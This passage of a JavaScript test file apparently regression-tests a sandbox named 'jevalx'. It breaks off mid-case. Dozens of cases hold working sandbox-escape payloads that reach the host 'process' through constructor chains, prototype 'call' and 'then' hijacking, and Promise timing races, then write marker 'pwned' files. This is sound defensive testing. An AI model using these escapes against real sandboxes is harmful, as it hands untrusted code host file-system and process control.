         console.log(`${case_id} result=`,await jevalx(code,));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r4d:async()=>{ var case_id= 'r4x';
var code=`
p = import('').constructor.prototype;
console.log('p=',p,typeof(p));
`;
       try{
         console.log(`${case_id} result=`,await jevalx(code,));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },


  r5:async()=>{
var case_id= 'r5';
var code=`
const i = import('');
try { i.then() } catch (e) {}
//delete i.constructor;//test if recover
//console.log('i.constructor'+i.constructor);
i.constructor.constructor("return process")().mainModule.require("fs").writeFileSync("pwned_${case_id}", "")
`;
       try{
         console.log(`${case_id} result=`,await jevalx(code,));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise));
  },

  r6:async function(){
let case_id = arguments.callee.name;
var code=`
const Function = (_=>_).constructor;
constructor.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_${case_id}', ''))"]));
import('fs').catch();
`;
       try{
         console.log(`${case_id} result=`,await jevalx(code,{},{timeout:666,json_output:false}));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise));
  },
  r7:async function(){
let case_id = arguments.callee.name;
var code=`
delete constructor;
const Function = (async _=>_).constructor;
constructor.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_${case_id}', ''))"]));
import('fs').catch();
`;
       try{
         console.log(`${case_id} result=`,await jevalx(code,{},{timeout:666,json_output:false}));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise));
  },
/////////////////////////
  r8:async function(){ let case_id = arguments.callee.name; var code=`
const Function = (_=>_).constructor;
toString.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r8', ''))"]));
import('fs').catch();
`;
     try{
       console.log(`${case_id} result(json)=`,await jevalx(code,{},{timeout:666,json_output:true}));
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r9:async function(){ let case_id = arguments.callee.name; var code=`
const Function = (_=>_).constructor;
toString.__proto__ = {call: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r9', ''))"]))};
import('fs').catch();
`;
     try{
       console.log(`${case_id} result(json)=`,await jevalx(code,{},{timeout:666,json_output:true}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r10:async function(){ let case_id = arguments.callee.name; var code=`
const Function = (_=>_).constructor;
valueOf.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r10', ''))"]));
import('fs').catch();
`;
     try{
       console.log(`${case_id} result(json)=`,await jevalx(code,{},{timeout:666,json_output:true}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r11:async function(){ let case_id = arguments.callee.name; var code=`
const Function = (_=>_).constructor;
setTimeout.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r11', ''))"]));
import('fs').catch();
`;
     try{
       console.log(`${case_id} result(json)=`,await jevalx(code,{},{timeout:666,json_output:true}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r12:async function(){ let case_id = arguments.callee.name; var code=`
const Function = (_=>_).constructor;
console.log.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r12', ''))"]));
import('fs').catch();
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

//need run full test to find
  r13:async function(){ let case_id = arguments.callee.name; var code=`
const t = setTimeout(_=>t.constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r13", ""), 1000);
`;
     try{
       console.log(`${case_id} result(json)=`,await jevalx(code,{},{timeout:666,json_output:true}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r14:async function(){ let case_id = arguments.callee.name; var code=`
Promise.delay(1234).then(_=>import('').constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r14", ""))
`;
     try{
       console.log(`${case_id} result(json)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r15:async function(){ let case_id = arguments.callee.name; var code=`
Promise.delay(1000).then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r15", ""))
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r15a:async function(){ let case_id = arguments.callee.name; var code=`
(async()=>Promise.delay(1000).then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r15a", "")))()
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
//the delay still return the host Promise.
  r15b:async function(){ let case_id = arguments.callee.name; var code=`
(async()=>{Promise.delay(1234,1234).catch(_=>_).then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r15b", ""))})()
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r15c:async function(){ let case_id = arguments.callee.name; var code=`
Promise.delay(1234).catch(_=>_).then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r15b", ""));Promise.delay(888)
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r16:async function(){ let case_id = arguments.callee.name; var code=`
const i = import('');
i.catch.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r16', ''))"]));
i.catch();
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r17:async function(){ let case_id = arguments.callee.name; var code=`
const i = import('');
i.finally.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r17', ''))"]));
i.catch();
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r18:async function(){ let case_id = arguments.callee.name; var code=`
const i = import('');
i.then.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r18', ''))"]));
i.catch();
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r19:async function(){ let case_id = arguments.callee.name; var code=`
const i = import('');
//delete i.constructor;
i.constructor.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r19', ''))"]));
i.catch();
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r20:async function(){ let case_id = arguments.callee.name; var code=`
const i = import('');
i.constructor.race.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r20', ''))"]));
i.catch();
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r21:async function(){ let case_id = arguments.callee.name; var code=`
Promise.resolve = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r21', ''))"]));
Promise.delay(1);
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r22:async function(){ let case_id = arguments.callee.name; var code=`
console.log.prototype.__proto__.constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r22", "")
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r22b:async function(){ let case_id = arguments.callee.name; var code=`
try {
    (function stack() {
        new Error().stack;
        stack();
    })();
} catch (e) {
e.constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r22b", ""); }
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r23:async function(){ let case_id = arguments.callee.name; var code=`
try {
    (function stack() {
        s = new EvalError().stack;
        stack();
    })();
} catch (e) {
e.constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r23", "");
}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  r24:async function(){ let case_id = arguments.callee.name; var code=`
let r=_=>_;
this.Error={get prepareStackTrace(){const l=r;r=1;return l;}};
try{
    try{null[1]}catch(e){e.stack}
}catch(e){
console.log('r24.e:'+e.constructor.prototype);
e.constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r24", ""); }
false
`
     try{
       //console.log(`${case_id} code=`,JSON.stringify(code));
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

r25:async function(){ let case_id = arguments.callee.name; var code=`
{then: {get: Function.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_r25', ''))")}}
`
   try{
     console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
   }catch(ex){
     console.log(`${case_id} ex=`,ex);
   }
   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},
r26:async function(){ let case_id = arguments.callee.name; var code=`
{then:[].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r26', ''))"]))}
`
   try{
     console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
   }catch(ex){
     console.log(`${case_id} ex=`,ex);
   }
   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},
r27:async function(){ let case_id = arguments.callee.name; var code=`
o={__proto__:{get then(){return [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_r27', ''))"]))}}};
o
`
   try{
     console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
   }catch(ex){
     console.log(`${case_id} ex=`,ex);
   }
   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},
r28:async function(){ let case_id = arguments.callee.name; var code=`
import('').catch(e=>{e.constructor.prototype.__defineSetter__('constructor', c=>c.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r28", ""))});
`
   try{
     console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
   }catch(ex){
     console.log(`${case_id} ex=`,ex);
   }
   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},
r29:async function(){ let case_id = arguments.callee.name; var code=`
const f = new FinalizationRegistry(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_r29", ""));
f.register({});
(async function a(c) {
	await Promise.resolve();
	Array.from({ length: 50000 }, () => () => {});
	if (c <= 5000) a(c+1);
})(0);
false
`
   try{
     console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
   }catch(ex){
     console.log(`${case_id} ex=`,ex);
   }
   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},

t1:async function(){ let case_id = arguments.callee.name; var code=`
({then:1,__proto__:{then:async(r)=>{r();for(let i=0;i<9;i++)await Promise.resolve();import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t1","")}}})
`;
   try{
     console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
   }catch(ex){
     console.log(`${case_id} ex=`,ex);
   }
   console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},
t2:async function(){ let case_id = arguments.callee.name; var code=`
const obj = {};
function t(r) {
	obj.then = undefined;
	f();
	r(obj);
	try {
		import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t2","");
	} catch (e) {}
}
async function f() {
	await Promise.resolve();
	await Promise.resolve();
	obj.then = t;
}
obj.then = t;
obj
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

t3:async function(){ let case_id = arguments.callee.name; var code=`
throw {message: 'EvilXd_t3', code: class{
	static get name() {
		(async()=>{
			await Promise.resolve();
			import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t3","");
		})();
	}
}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

t4:async function(){ let case_id = arguments.callee.name; var code=`
let c=2;
({__proto__:{get then(){return c-->0?1:r=>{
	(async()=>{
		throw {
			get message() {
				r();
				(async()=>{
					for(let i=0;i<4;i++) await Promise.resolve();
					import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t4","");
				})();
			}
		}
	})();
}}}})
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t5:async function(){ let case_id = arguments.callee.name; var code=`
const obj = {};
function t(r) {
	obj.then = undefined;
	f();
	r(obj);
	try {
		import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t5","");
	} catch (e) {}
}
async function f() {
	await Promise.resolve();
	await Promise.resolve();
	obj.then = t;
}
f();
obj
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t6:async function(){ let case_id = arguments.callee.name; var code=`
const obj = {};
function t(r) {
	obj.then = undefined;
	f();
	r(obj);
	try {
		import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t6","");
	} catch (e) {}
}
async function f() {
	await Promise.resolve();
	await Promise.resolve();
	await Promise.resolve();
	obj.then = t;
}
f();
obj
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t7:async function(){ let case_id = arguments.callee.name; var code=`
const obj = {};
function t(r) {
	obj.then = undefined;
	f();
	r(obj);
	try {
		import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t7","");
	} catch (e) {}
}
async function f() {
	await Promise.resolve();
	await Promise.resolve();
	await Promise.resolve();
	await Promise.resolve();
	obj.then = t;
}
f();
obj
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

t8:async function(){ let case_id = arguments.callee.name; var code=`
const obj = {};
function t(r) {
	obj.then = undefined;
	f();
	r(obj);
	try {
		import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t8","");
	} catch (e) {}
}
async function f() {
	await Promise.resolve(); obj.then = t;
	await Promise.resolve(); obj.then = t;
	await Promise.resolve(); obj.then = t;
	await Promise.resolve(); obj.then = t;
	await Promise.resolve(); obj.then = t;
	await Promise.resolve(); obj.then = t;
}
f();
obj
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t9:async function(){ let case_id = arguments.callee.name; var code=`
const obj = {};
function t(r) {
	obj.then = undefined;
	f();
	r(obj);
	try {
		import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t9","");
	} catch (e) {}
}
async function f() {
	await Promise.resolve();
	obj.then = t;
}
f();
obj
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t10:async function(){ let case_id = arguments.callee.name; var code=`
({__proto__: {
	get then() {
		Promise.resolve().then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t10","")).catch(_=>_);
		return undefined;
	}
}})
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t11:async function(){ let case_id = arguments.callee.name; var code=`
({constructor: {prototype: {
	get then() {
		Promise.resolve().then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t11","")).catch(_=>_);
		return undefined;
	}
}}})
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t12:async function(){ let case_id = arguments.callee.name; var code=`
({__proto__:{constructor: {prototype: {
	get then() {
		Promise.resolve().then(_=>import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t12","")).catch(_=>_);
		return undefined;
	}
}}}})
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t13:async function(){ let case_id = arguments.callee.name; var code=`
const old=Promise.prototype.then;
Promise.prototype.then=function(r,e){return old.call(this,v=>{try{r(v)}catch(e){}},e)};
({
	get then() {
		(async()=>{
			for(let i=0;i<10;i++)await Promise.resolve();
			try{import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t13","");}catch(e){}
		})();
		return undefined;
	}
})
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t14:async function(){ let case_id = arguments.callee.name; var code=`
o={};
w=f=>toString.call.bind(f.call,f,0);
d=f=>Promise.resolve().then(w(f));
t=r=>{
	o.then=0;
	r(o);
	d(()=>d(()=>toString.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t14","")));
};
d(()=>d(()=>{o.then=w(t)}));
o
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t15:async function(){ let case_id = arguments.callee.name; var code=`
o=[];
w=f=>toString.call.bind(f.call,f,0);
d=f=>Promise.resolve().then(w(f));
t=r=>{
	o.then=0;
	r(o);
	d(()=>d(()=>toString.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t15","")));
};
d(()=>d(()=>{o.then=w(t)}));
o
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
t16:async function(){ let case_id = arguments.callee.name; var code=`
o=[];
w=f=>toString.call.bind(f.call,f,0);
d=f=>Promise.resolve().then(w(f));
t=r=>{
	o.then=0;
	r(o);
	d(()=>d(()=>toString.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t16","")));
};
d(()=>d(()=>{o.then=w(t)}));
[o]
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:true}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s1:async function(){ let case_id = arguments.callee.name; var code=`
f=()=>{try{toString.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s1","")}catch(e){Promise.resolve().then(toString.call.bind(f.call,f,0))}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s2:async function(){ let case_id = arguments.callee.name; var code=`
f=()=>{try{valueOf.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s2","")}catch(e){Promise.resolve().then(valueOf.call.bind(f.call,f,0))}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s3:async function(){ let case_id = arguments.callee.name; var code=`
f=()=>{try{eval.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s3","")}catch(e){Promise.resolve().then(eval.call.bind(f.call,f,0))}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s4:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s4","")}catch(e){Promise.resolve().then(h.call.bind(f.call,f,0))}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s5:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
//f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s5","")}catch(e){(async()=>0)().then(h.call.bind(f.call,f,0))}};
f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s5","")}catch(e){(async()=>{
(async()=>0).then(h.call.bind(f.call,f,0))
//h.call.bind(f.call,f,0)
})()//.then(h.call.bind(f.call,f,0))
}};
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s6:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s6","")}catch(e){Promise.resolve().then(h.call.bind(f.call,f,0))}}
throw f();
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

s7:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
t=Promise.prototype.then;
f=()=>{Promise.prototype.then=t;try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s7","")}catch(e){Promise.resolve().then(h.call.bind(f.call,f,0))}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s8:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
t=Promise.prototype.catch;
f=()=>{Promise.prototype.then=t;try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s8","")}catch(e){Promise.resolve().then(h.call.bind(f.call,f,0))}};
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s9:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s9","")}catch(e){import('').catch(h.call.bind(f.call,f,0))}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s10:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
(async()=>{
	while(!Promise.prototype.then) await Promise.resolve();
	f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s10","")}catch(e){Promise.resolve().then(h.call.bind(f.call,f,0))}}
	f();
})();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s11:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
(async()=>{
	while(!(t=Promise.prototype.then)) await Promise.resolve();
	f=()=>{try{h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s11","")}catch(e){t.call(Promise.resolve(),h.call.bind(f.call,f,0))}}
	f();
})();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s12:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
f=async()=>{try{ h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s12","")}catch(e){ await{then:h.call.bind(f.call,f,0)}}}
f();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:1111,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

s13:async function(){ let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s13",""):await{then:h.call.bind(f.call,f,0)}
f();
1
`
     try{
